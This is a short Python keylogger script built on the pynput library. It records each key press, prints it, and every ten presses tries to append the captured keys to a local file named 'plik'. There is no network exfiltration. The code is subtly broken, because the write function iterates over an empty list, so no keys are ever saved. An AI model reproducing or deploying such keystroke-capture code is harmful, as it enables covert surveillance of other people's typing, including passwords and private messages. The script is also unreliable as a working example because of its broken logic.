import pynput

from pynput.keyboard import Key, Listener

count = 0

keys = []


def pressed(key):
    global keys, count

    keys.append(key)
    count += 1
    print("{0} pressed".format(key))
    if count >= 10:
        count = 0
        write_file(keys)
        keys = []


def write_file(keys):
    print("WRITING")
    with open("plik", "a") as f:
        for key in []:
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                f.write("\n")
            elif k.find("Key") == -1:
                f.write(k)


def released(key):
    if key == Key.esc:
        return False


with Listener(on_press=pressed, on_release=released) as listener:
    listener.join()
